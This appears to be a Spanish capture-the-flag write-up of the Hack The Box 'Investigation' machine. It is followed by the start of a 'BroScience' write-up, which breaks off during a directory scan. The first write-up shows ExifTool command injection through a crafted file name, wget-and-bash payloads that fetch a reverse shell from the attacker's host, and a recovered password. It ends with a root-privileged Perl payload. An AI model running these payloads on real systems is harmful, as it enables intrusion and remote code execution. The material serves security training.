HTTP/1.1 301 Moved Permanently Date: Thu, 26 Jan 2023 21:15:14 GMT Server: Apache/2.4.41 (Ubuntu) Location: http://eforenzics.htb/ Content-Type: text/html; charset=iso-8859-1 ➜ investigation El sitio a simple vista parece ser estatico.\nSi nos dirigimos al \u0026lsquo;Free Services\u0026rsquo; nos muestra un formulario para subir archivos para realizar un analisis forense, unicamente imagenes.\nEl formulario envia el archivo a upload.php por medio del metodo POST.\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;div class=\u0026#34;col-md-5 d-none d-md-block\u0026#34;\u0026gt; \u0026lt;form method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34; action=\u0026#34;upload.php\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-md-6\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;form-group pb-1\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;image\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; class=\u0026#34;btn btn-outline-light btn-flat\u0026#34; name=\u0026#34;upload\u0026#34; value=\u0026#34;Upload\u0026#34; \u0026lt;span style=\u0026#34;margin-left:1em\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; Directory Brute Forcing feroxbuster muestra algunas de las paginas que ya visitamos y conocemos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 π ~/htb/investigation ❯ feroxbuster -w $MD -u http://eforenzics.htb/ --depth 2 -x php,html ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.7.3 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://eforenzics.htb/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.7.3 💉 Config File │ /etc/feroxbuster/ferox-config.toml 💲 Extensions │ [php, html] 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 2 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 200 GET 208l 629w 10957c http://eforenzics.htb/ 403 GET 9l 28w 279c http://eforenzics.htb/.php 200 GET 208l 629w 10957c http://eforenzics.htb/index.html 403 GET 9l 28w 279c http://eforenzics.htb/.html 301 GET 9l 28w 317c http://eforenzics.htb/assets =\u0026gt; http://eforenzics.htb/assets/ 200 GET 82l 198w 0c http://eforenzics.htb/upload.php 200 GET 91l 227w 4335c http://eforenzics.htb/service.html 301 GET 9l 28w 321c http://eforenzics.htb/assets/css =\u0026gt; http://eforenzics.htb/assets/css/ 301 GET 9l 28w 322c http://eforenzics.htb/assets/imgs =\u0026gt; http://eforenzics.htb/assets/imgs/ 301 GET 9l 28w 320c http://eforenzics.htb/assets/js =\u0026gt; http://eforenzics.htb/assets/js/ 301 GET 9l 28w 325c http://eforenzics.htb/assets/vendors =\u0026gt; http://eforenzics.htb/assets/vendors/ 403 GET 9l 28w 279c http://eforenzics.htb/server-status User - www-data ExifTool Al subir una imagen nos muestra un mensaje sobre un reporte y un enlace hacia el mismo.\nAl visitar el enlace vemos que es un archivo de texto con informacion de los metadatos de la imagen. Se muestra que la herramienta utilizada es exiftool y la version es 12.37.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 π ~/htb/investigation ❯ curl -s http://eforenzics.htb/analysed_images/avatarjpg.txt ExifTool Version Number : 12.37 File Name : avatar.jpg Directory : . File Size : 16 KiB File Modification Date/Time : 2023:03:04 02:33:29+00:00 File Access Date/Time : 2023:03:04 02:33:29+00:00 File Inode Change Date/Time : 2023:03:04 02:33:29+00:00 File Permissions : -rw-r--r-- File Type : JPEG File Type Extension : jpg MIME Type : image/jpeg JFIF Version : 1.01 Resolution Unit : None X Resolution : 1 Y Resolution : 1 Image Width : 250 Image Height : 250 Encoding Process : Progressive DCT, Huffman coding Bits Per Sample : 8 Color Components : 3 Y Cb Cr Sub Sampling : YCbCr4:4:4 (1 1) Image Size : 250x250 Megapixels : 0.062 π ~/htb/investigation ❯ Command Injection Una busqueda sobre vulnerabilidades que afectan a esta version nos llevo al CVE-2022-23935 el cual describe la posibilidad de Command Injection, ademas encontramos un Gist en el que se explica la vulnerabilidad y un PoC. Utilizando el caracter | en el nombre del archivo permitiria ejecutar comandos.\nCreamos un archivo con un archivo que contiene el comando para realizar un ping a nuestra maquina, o simplemente cambiar el nombre del archivo por medio de BurpSuite.\n1 ➜ investigation mv avatar1.jpg \u0026#39;ping -c 2 10.10.14.207 |\u0026#39; El archivo generado por exiftool muestra el nombre del archivo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ➜ investigation curl -s http://eforenzics.htb/analysed_images/pingc2101014207.txt ExifTool Version Number : 12.37 File Name : ping -c 2 10.10.14.207 | Directory : . File Size : 0 bytes File Modification Date/Time : 2023:01:26 21:27:50+00:00 File Access Date/Time : 2023:01:26 21:27:50+00:00 File Inode Change Date/Time : 2023:01:26 21:27:50+00:00 File Permissions : prw------- File Type : TXT File Type Extension : txt MIME Type : text/plain MIME Encoding : us-ascii Newlines : Unix LF Line Count : 7 Word Count : 43 ➜ investigation Por otro lado, luego de ejecutar tcpdump obtuvimos pings desde la maquina.\n1 2 3 4 5 6 7 ➜ investigation sudo tcpdump -i tun1 icmp tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on tun1, link-type RAW (Raw IP), snapshot length 262144 bytes 15:27:55.062939 IP eforenzics.htb \u0026gt; 10.10.14.207: ICMP echo request, id 2, seq 1, length 64 15:27:55.062960 IP 10.10.14.207 \u0026gt; eforenzics.htb: ICMP echo reply, id 2, seq 1, length 64 15:27:56.065319 IP eforenzics.htb \u0026gt; 10.10.14.207: ICMP echo request, id 2, seq 2, length 64 15:27:56.065367 IP 10.10.14.207 \u0026gt; eforenzics.htb: ICMP echo reply, id 2, seq 2, length 64 Shell creamos un archivo con shells inversa con shells, lo guardamos en un servidor http de python.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ➜ www wget 10.10.14.207/10.10.14.207:1335 -O shell --2023-01-26 15:36:48-- http://10.10.14.207/10.10.14.207:1335 Connecting to 10.10.14.207:80... connected. HTTP request sent, awaiting response... 200 OK Length: 3810 (3.7K) [text/plain] Saving to: ‘shell’ shell 100%[============================\u0026gt;] 3.72K --.-KB/s in 0s 2023-01-26 15:36:48 (124 MB/s) - ‘shell’ saved [3810/3810] ➜ www ls shell ➜ www ➜ www mv shell index.html ➜ www httphere . Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... Cambiamos de nombre al archivo para descargar y ejecutar el archivo.\n1 2 # file name wget 10.10.14.207 -O id \u0026amp;\u0026amp; bash id | Tras un momento logramos obtener una shell inversa como www-data.\n1 2 3 4 5 6 7 8 9 10 11 12 13 ➜ investigation rlwrap nc -lvp 1335 listening on [any] 1335 ... connect to [10.10.14.207] from eforenzics.htb [10.10.11.197] 60368 can\u0026#39;t access tty; job control turned off $ which python $ which python3 /usr/bin/python3 $ python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; www-data@investigation:~/uploads/1674769169$ whoami;id;pwd www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) /var/www/uploads/1674769169 www-data@investigation:~/uploads/1674769169$ En upload.php vemos que exiftool es ejecutado sobre todas las imagenes de un folder temporal enviando el resultado a un archivo de texto.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 www-data@investigation:~/html$ cat upload.php \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; [ ... ] \u0026lt;?php if (isset($_POST[\u0026#39;upload\u0026#39;]) \u0026amp;\u0026amp; $_FILES[\u0026#39;image\u0026#39;][\u0026#39;error\u0026#39;]==0) { $allow_type = array(\u0026#39;image/jpeg\u0026#39;,\u0026#39;image/png\u0026#39;); $image_name = $_FILES[\u0026#39;image\u0026#39;][\u0026#39;name\u0026#39;]; $original_name = $image_name; $sanitised = preg_replace(\u0026#39;/[^a-zA-Z0-9]+/\u0026#39;, \u0026#39;\u0026#39;, $original_name); $image_type = getimagesize($_FILES[\u0026#39;image\u0026#39;][\u0026#39;tmp_name\u0026#39;]); $image_name = explode(\u0026#39;.\u0026#39;,$image_name); $folder=time(); if(in_array($image_type[\u0026#39;mime\u0026#39;], $allow_type)){ list($width, $height, $mime) = getimagesize($_FILES[\u0026#39;image\u0026#39;][\u0026#39;tmp_name\u0026#39;]); if ($width\u0026gt;0 \u0026amp;\u0026amp; $height\u0026gt;0) { mkdir(\u0026#34;/var/www/uploads/$folder\u0026#34;); $upload = move_uploaded_file($_FILES[\u0026#39;image\u0026#39;][\u0026#39;tmp_name\u0026#39;], \u0026#39;/var/www/uploads/\u0026#39;.$folder.\u0026#39;/\u0026#39;.$_FILES[\u0026#39;image\u0026#39;][\u0026#39;name\u0026#39;]); if ($upload) { echo \u0026#39;\u0026lt;p\u0026gt;\u0026#39;.$sanitised.\u0026#39; has been uploaded. The analysis report can be viewed \u0026lt;a href=analysed_images/\u0026#39;.$sanitised.\u0026#39;.txt\u0026gt;here\u0026lt;/a\u0026gt; \u0026lt;/p\u0026gt;\u0026#39;; echo \u0026#39;\u0026lt;p\u0026gt;Please save this report as it will only be available for the next five minutes\u0026lt;/p\u0026gt;\u0026#39;; $folder = \u0026#34;/var/www/uploads/$folder\u0026#34;; $cmd = \u0026#34;cd $folder \u0026amp;\u0026amp; /opt/exiftool/exiftool * \u0026gt; /var/www/html/analysed_images/$sanitised.txt\u0026#34;; shell_exec($cmd); } } else { echo \u0026#39;Error: Only JPEG and PNG are allowed\u0026#39;; } } else { echo \u0026#39;Error: Only JPEG and PNG are allow\u0026#39;; } }else { echo \u0026#39;Error: Invalid File Type!\u0026#39;; } ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/header\u0026gt; [ ... ] \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; www-data@investigation:~/html$ User - Smorton En el archivo /etc/passwd descubrimos al usuario smorton, buscamos archivos y directorios a los que este usuario tiene acceso. Observamos que existe un archivo con extension msg.\n1 2 3 4 5 6 7 8 9 www-data@investigation:~$ find / -user smorton 2\u0026gt;/dev/null|grep -v proc /home/smorton [...] /run/user/1000 /usr/local/investigation/Windows Event Logs for Analysis.msg /dev/pts/2 www-data@investigation:~$ Segun el comando file contiene un log de eventos de Windows.\n1 2 3 4 5 6 7 8 9 10 www-data@investigation:/usr/local/investigation$ ls -lah total 1.3M drwxr-xr-x 2 root root 4.0K Sep 30 23:43 . drwxr-xr-x 11 root root 4.0K Aug 27 21:54 .. -rw-rw-r-- 1 smorton smorton 1.3M Oct 1 00:35 \u0026#39;Windows Event Logs for Analysis.msg\u0026#39; -rw-rw-r-- 1 www-data www-data 0 Oct 1 00:40 analysed_log www-data@investigation:/usr/local/investigation file \u0026#39;Windows Event Logs for Analysis.msg\u0026#39; \u0026lt;igation$ file \u0026#39;Windows Event Logs for Analysis.msg\u0026#39; Windows Event Logs for Analysis.msg: CDFV2 Microsoft Outlook Message www-data@investigation:/usr/local/investigation$ Obtuvimos este archivo localmente.\n1 2 3 4 5 ➜ www ls -lah file.msg -rw-r--r-- 1 kirby kirby 1.3M ene 26 15:47 file.msg ➜ www file file.msg file.msg: CDFV2 Microsoft Outlook Message ➜ www Como lo sugiere un usuario en superuser convertimos este archivo a eml para poder observar su contenido como un correo.\n1 2 3 4 5 6 ➜ www ls file.msg file.msg ➜ www msgconvert --outfile file.eml file.msg ➜ www file file.eml file.eml: ASCII text, with CRLF line terminators ➜ www Al ser un archivo eml, este contiene la estructura de un email.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 ➜ www head -n 35 file.eml Date: Tue, 16 Sept 2022 00:30:29 +0000 MIME-Version: 1.0 Content-Type: multipart/mixed; boundary=16747697951.e0C5.30607 Content-Transfer-Encoding: 7bit Subject: Windows Event Logs for Analysis From: Thomas Jones \u0026lt;thomas.jones@eforenzics.htb\u0026gt; To: Steve Morton \u0026lt;steve.morton@eforenzics.htb\u0026gt; Thread-Topic: Windows Event Logs for Analysis Accept-Language: en-US Content-Language: en-US --16747697951.e0C5.30607 MIME-Version: 1.0 Content-Type: multipart/alternative; boundary=16747697950.60Df5bdBB.30607 Content-Transfer-Encoding: 7bit --16747697950.60Df5bdBB.30607 Content-Type: text/plain; charset=ISO-8859-1 Content-Disposition: inline Content-Transfer-Encoding: 8bit Hi Steve, Can you look through these logs to see if our analysts have been logging on to the inspection terminal. I\u0026#39;m concerned that they are moving data on to production without following our data transfer procedures. Regards. Tom --16747697950.60Df5bdBB.30607 Content-Type: application/rtf Content-Disposition: inline Content-Transfer-Encoding: base64 Thunderbird Utilizando Thunderbird abrimos el archivo, el cual nos muestra un correo que explica sobre un archivo de log para ser analizado. Ademas hay un archivo adjunto: evtx-log.zip.\nAl descomprimir el archivo vemos un archivo evtx de eventos de windows.\n1 2 3 4 5 6 ➜ www unzip evtx-logs.zip Archive: evtx-logs.zip inflating: security.evtx ➜ www file security.evtx security.evtx: MS Windows Vista Event Log, 238 chunks (no. 237 in use), next record no. 20013 ➜ www Windows Event Log Utilizando una maquina Windows analizamos el archivo, observando los diferentes eventos encontramos un evento que contiene el nombre de un usuario inusual.\n1 Def@ultf0r3nz!csPa$$ Intentamos utilizar este usuario como contraseña para el usuario smorton la cual funciono.\n1 2 3 4 5 6 www-data@investigation:/usr/local/investigation$ su smorton Password: Def@ultf0r3nz!csPa$$ smorton@investigation:/usr/local/investigation$ whoami;id smorton uid=1000(smorton) gid=1000(smorton) groups=1000(smorton) smorton@investigation:/usr/local/investigation$ Logrando asi acceder a nuestra flag user.txt.\n1 2 3 4 5 6 smorton@investigation:/usr/local/investigation$ cd smorton@investigation:~$ ls libcurl-gnutls.so.4 pawnd.pl user.txt smorton@investigation:~$ cat user.txt 38d611d9772b12a78cac609f27409f50 smorton@investigation:~$ Privesc Al ejecutar sudo observamos que el usuarios morton puede ejecutar como root el archivo binary.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 smorton@investigation:~$ sudo -l -l Matching Defaults entries for smorton on investigation: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User smorton may run the following commands on investigation: Sudoers entry: RunAsUsers: root Options: !authenticate Commands: /usr/bin/binary smorton@investigation:~$ sudo /usr/bin/binary Exiting... smorton@investigation:~$ file /usr/bin/binary /usr/bin/binary: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a703575c5c944bfcfea8a04f0aabaf0b4fa9f7cb, for GNU/Linux 3.2.0, not stripped smorton@investigation:~$ Al ejecutar strings sobre el archivo vemos el uso de curl, perl y el comando rm.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 smorton@investigation:~$ strings /usr/bin/binary /lib64/ld-linux-x86-64.so.2 libcurl-gnutls.so.4 __gmon_start__ _ITM_deregisterTMCloneTable _ITM_registerTMCloneTable curl_easy_cleanup curl_easy_init curl_easy_setopt curl_easy_perform libc.so.6 setuid exit fopen puts fclose malloc system getuid __cxa_finalize strcmp __libc_start_main snprintf GLIBC_2.2.5 CURL_GNUTLS_3 u+UH []A\\A]A^A_ Exiting... lDnxUysaQn Running... perl ./%s rm -f ./lDnxUysaQn :*3$\u0026#34; GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0 crtstuff.c deregister_tm_clones __do_global_dtors_aux completed.8061 __do_global_dtors_aux_fini_array_entry frame_dummy __frame_dummy_init_array_entry binary.c _curl_easy_setopt_err_long _curl_easy_setopt_err_curl_off_t _curl_easy_setopt_err_string [.. snip ..] .eh_frame .init_array .fini_array .dynamic .data .bss .comment smorton@investigation:~$ Ghidra Al analizar el archivo con ghidra obtuvimos el codigo fuente del archivo binary.\nTras analizar el codigo en Ghidra encontramos que:\nDebe de ser ejecutado como root. Debe de tenener dos argumentos o el programa muere. El segundo argumento debe de ser la string \u0026rsquo;lDnxUysaQn\u0026rsquo; Si lo anterior es correcto, crea una petición utilizando curl, tomando como url el primer argumento, el segundo argumento lo toma para guardar el contenido de la petición. Seguidamente si la petición se realizó con exito, ejecuta perl sobre el archivo donde se guardó el contenido, es decir \u0026rsquo;lDnxUysaQn\u0026rsquo;, finalmente elimina el archivo mencionado utilizando \u0026lsquo;rm -f ./lDnxUysaQn\u0026rsquo;. Codigo Ghidra\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 undefined8 main(int param_1,long param_2) { __uid_t _Var1; int var_two; FILE *__stream; undefined8 var_three; char *__s; char *__s_00; if (param_1 != 3) { puts(\u0026#34;Exiting... \u0026#34;); /* WARNING: Subroutine does not return */ exit(0); } _Var1 = getuid(); if (_Var1 != 0) { puts(\u0026#34;Exiting... \u0026#34;); /* WARNING: Subroutine does not return */ exit(0); } var_two = strcmp(*(char **)(param_2 + 0x10),\u0026#34;lDnxUysaQn\u0026#34;); if (var_two != 0) { puts(\u0026#34;Exiting... \u0026#34;); /* WARNING: Subroutine does not return */ exit(0); } puts(\u0026#34;Running... \u0026#34;); __stream = fopen(*(char **)(param_2 + 0x10),\u0026#34;wb\u0026#34;); var_three = curl_easy_init(); curl_easy_setopt(var_three,0x2712,*(undefined8 *)(param_2 + 8)); curl_easy_setopt(var_three,0x2711,__stream); curl_easy_setopt(var_three,0x2d,1); var_two = curl_easy_perform(var_three); if (var_two == 0) { var_two = snprintf((char *)0x0,0,\u0026#34;%s\u0026#34;,*(undefined8 *)(param_2 + 0x10)); __s = (char *)malloc((long)var_two + 1); snprintf(__s,(long)var_two + 1,\u0026#34;%s\u0026#34;,*(undefined8 *)(param_2 + 0x10)); var_two = snprintf((char *)0x0,0,\u0026#34;perl ./%s\u0026#34;,__s); __s_00 = (char *)malloc((long)var_two + 1); snprintf(__s_00,(long)var_two + 1,\u0026#34;perl ./%s\u0026#34;,__s); fclose(__stream); curl_easy_cleanup(var_three); setuid(0); system(__s_00); system(\u0026#34;rm -f ./lDnxUysaQn\u0026#34;); return 0; } puts(\u0026#34;Exiting... \u0026#34;); /* WARNING: Subroutine does not return */ exit(0); } Command Execution Como sabemos el archivo de la petición es ejecutado por perl, es por ello que creamos un archivo el cual contenga codigo perl, en este caso una prueba para crear un archivo temporal, colocandolo en un servidor http.\n1 system(\u0026#39;touch /tmp/create_file\u0026#39;) Solo queda ejecutar el binario con la dirección url y archivo que contiene codigo perl. Observamos que el archivo lo creo el usuario root.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 smorton@investigation:/dev/shm$ sudo /usr/bin/binary \u0026#34;10.10.14.207/file.txt\u0026#34; lDnxUysaQn Running... smorton@investigation:/dev/shm$ ls -lah /tmp/ total 52K drwxrwxrwt 13 root root 4.0K Jan 27 01:22 . drwxr-xr-x 18 root root 4.0K Jan 9 16:53 .. drwxrwxrwt 2 root root 4.0K Jan 27 01:13 .ICE-unix drwxrwxrwt 2 root root 4.0K Jan 27 01:13 .Test-unix drwxrwxrwt 2 root root 4.0K Jan 27 01:13 .X11-unix drwxrwxrwt 2 root root 4.0K Jan 27 01:13 .XIM-unix drwxrwxrwt 2 root root 4.0K Jan 27 01:13 .font-unix -rw-r--r-- 1 root root 0 Jan 27 01:22 create_file drwx------ 3 root root 4.0K Jan 27 01:13 systemd-private-0e96e5020fe445b0b5f620440bc6af6f-ModemManager.service-0Edlwi drwx------ 3 root root 4.0K Jan 27 01:13 systemd-private-0e96e5020fe445b0b5f620440bc6af6f-apache2.service-BOcwzg drwx------ 3 root root 4.0K Jan 27 01:13 systemd-private-0e96e5020fe445b0b5f620440bc6af6f-systemd-logind.service-riRTng drwx------ 3 root root 4.0K Jan 27 01:13 systemd-private-0e96e5020fe445b0b5f620440bc6af6f-systemd-resolved.service-lavR7g drwx------ 3 root root 4.0K Jan 27 01:13 systemd-private-0e96e5020fe445b0b5f620440bc6af6f-systemd-timesyncd.service-EpUhJh drwx------ 2 root root 4.0K Jan 27 01:14 vmware-root_734-2991268422 smorton@investigation:/dev/shm$ Shell Modificamos el codigo perl para ejecutar una shell inversa con shells.\n1 system(\u0026#34;wget -qO- 10.10.14.207/10.10.14.207:1335|bash\u0026#34;) Tras ejecutar el archivo obtuvimos una shell root y la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 ➜ www rlwrap nc -lvp 1335 listening on [any] 1335 ... connect to [10.10.14.207] from eforenzics.htb [10.10.11.197] 47008 # whoami;id;pwd root uid=0(root) gid=0(root) groups=0(root) /dev/shm # cd # ls root.txt # cat root.txt 1ae6c314a10a363be69ebb8145fa3ac6 # ","description":"Investigation presenta un sitio que permite analizar los metadatos de una imagen mediante ExifTool, encontramos que la version es vulnerable lo que nos permitio acceder a la maquina. Tras analizar un archivo de Eventos de Windows encontramos credenciales para un segundo usuario. Finalmente escalamos privilegios tras analizar el codigo fuente de un ejecutable con Ghidra.","id":2,"section":"posts","tags":["exiftool","command injection","CVE-2022-23935","windows-event-logs","evtx","ghidra","curl","perl"],"title":"Hack The Box - Investigation","uri":"https://sckull.github.io/posts/investigation/"},{"content":"\rBroScience expone un sitio web vulnerable por el cual realizamos la lectura de su codigo fuente, con ello registramos un usuario e identificamos una vulnerabilidad de \u0026lsquo;Deserialization\u0026rsquo; que nos permitio la creacion y \u0026rsquo;ejecucion\u0026rsquo; de archivos PHP para darnos acceso a la maquina. En la base de datos del sitio descubrimos hashes que nos permitieron acceder a un segundo usuario. Finalmente tras realizar \u0026lsquo;Command Injection\u0026rsquo; en el Common Name de un certificado expirado que es utilizado por un script de un cronjob logramos escalar privilegios.\nNombre BroScience OS Linux Puntos 30 Dificultad Media IP 10.10.11.195 Maker bmdyy\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6, 5.8, 4.8, 5.2, 4.2],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap nmap muestra multiples puertos abiertos: http (80), https (443) y ssh (22).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 # Nmap 7.93 scan initiated Mon Mar 6 18:00:41 2023 as: nmap -p22,80,443 -sV -sC -oN nmap_scan 10.10.11.195 Nmap scan report for 10.10.11.195 Host is up (0.068s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 df17c6bab18222d91db5ebff5d3d2cb7 (RSA) | 256 3f8a56f8958faeafe3ae7eb880f679d2 (ECDSA) |_ 256 3c6575274ae2ef9391374cfdd9d46341 (ED25519) 80/tcp open http Apache httpd 2.4.54 |_http-title: Did not follow redirect to https://broscience.htb/ |_http-server-header: Apache/2.4.54 (Debian) 443/tcp open ssl/http Apache httpd 2.4.54 ((Debian)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set | tls-alpn: |_ http/1.1 |_http-title: BroScience : Home | ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT | Not valid before: 2022-07-14T19:48:36 |_Not valid after: 2023-07-14T19:48:36 |_http-server-header: Apache/2.4.54 (Debian) |_ssl-date: TLS randomness does not represent time Service Info: Host: broscience.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Mar 6 18:01:01 2023 -- 1 IP address (1 host up) scanned in 19.87 seconds Web Site El sitio web redirige hacia el dominio broscience.htb.\n1 2 3 4 5 6 7 ┌─[kirby@parrot]─[~/htb/broscience] └──╼ $curl -sI 10.10.11.195 HTTP/1.1 301 Moved Permanently Date: Fri, 17 Feb 2023 16:51:59 GMT Server: Apache/2.4.54 (Debian) Location: https://broscience.htb/ Content-Type: text/html; charset=iso-8859-1 Se muestra una lista de articulos, en cada uno, se muestra el autor.\nSe utilizan las imagenes como valor del parametro path a la pagina img.php.\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;div class=\u0026#34;uk-card uk-card-default \u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;uk-card-media-top\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;includes/img.php?path=seated_rows.png\u0026#34; width=\u0026#34;600\u0026#34; height=\u0026#34;600\u0026#34; alt=\u0026#34;\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;uk-card-body\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;exercise.php?id=3\u0026#34; class=\u0026#34;uk-card-title\u0026#34;\u0026gt;Seated Rows\u0026lt;/a\u0026gt; \u0026lt;p\u0026gt;If you want to target your lats, seated rows are a great exercise to do so. There are machines where... \u0026lt;a href=\u0026#34;exercise.php?id=3\u0026#34;\u0026gt;keep reading\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;uk-card-footer\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;uk-text-meta\u0026#34;\u0026gt;Written by \u0026lt;a class=\u0026#34;uk-link-text\u0026#34; href=\u0026#34;user.php?id=2\u0026#34;\u0026gt;bill\u0026lt;/a\u0026gt; 9 months ago\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; Creamos un wordlist con los cuatro autores en la lista de articulos.\n1 2 3 4 5 6 7 π ~/htb/broscience ❯ curl -sk https://broscience.htb/ | grep user.php| cut -d \u0026#39;\u0026gt;\u0026#39; -f3 | tr -d \u0026#39;\u0026lt;/\u0026#39;| sort -u | uniq \u0026gt; users.txt π ~/htb/broscience ❯ cat users.txt administratora billa johna michaela π ~/htb/broscience ❯ Directory Brute Forcing feroxbuster muestra multiples paginas y los \u0026lsquo;directorios\u0026rsquo; /include, /images y /manual.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 ┌─[kirby@parrot]─[~/htb/broscience/dotdotpwn] └──╼ $feroxbuster -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u https://broscience.htb -k --depth 2 -x php ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.3.3 ───────────────────────────┬────────────────────── 🎯 Target Url │ https://broscience.htb 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.3.3 💉 Config File │ /etc/feroxbuster/ferox-config.toml 💲 Extensions │ [php] 🔓 Insecure │ true 🔃 Recursion Depth │ 2 